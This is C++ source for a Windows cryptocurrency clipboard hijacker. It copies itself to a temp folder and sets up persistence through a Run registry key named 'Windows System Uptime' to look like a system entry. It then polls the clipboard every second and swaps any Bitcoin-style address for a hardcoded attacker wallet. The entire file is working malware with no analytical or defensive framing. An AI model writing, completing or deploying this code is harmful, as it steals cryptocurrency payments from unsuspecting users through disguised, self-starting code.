#include <windows.h>
#include <iostream>
#include <regex>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <filesystem>
using namespace std;

// 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH

void setClipboard(char *newText) {
    char const *output = newText;
    const size_t len = strlen(output) + 1;
    HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hMem), output, len);
    GlobalUnlock(hMem);
    OpenClipboard(0);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
}

char* getClipboard() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        char* clipText = (char*) hData;
        CloseClipboard();
        return clipText;
    }
    CloseClipboard();
    return NULL;
}

bool validateAddress(char *address) {
    regex pattern("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
    if (regex_match(address, pattern)) {
        return true;
    } else {
        return false;
    }
}

void addStartup() {
    const char path[] = "C:\\Temp\\manager.exe";
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if( ERROR_SUCCESS == lnRes ) {
        lnRes = RegSetValueEx(hKey, "Windows System Uptime", 0, REG_SZ, (BYTE*) path, strlen(path));
        RegCloseKey(hKey);
    }
}


void copy_self(char* filename) {
    CreateDirectory("C:\\Temp\\", NULL);
    if (filesystem::exists("C:\\Temp\\manager.exe")) {
        return; 
    }
    else {
        CopyFile(filename, "C:\\Temp\\manager.exe", FALSE);
    }
    
}

int main(int argc, char *argv[]) {
    char address[] = "bc1qlkt252pj7z4nfsq48maejm6k9054jsp5ulxz72";
    copy_self(argv[0]);
    addStartup();
    for ( ; ; ) {
        if (validateAddress(getClipboard())) {
            setClipboard(address);
        }
        Sleep(1000);
    }
    return 0;
}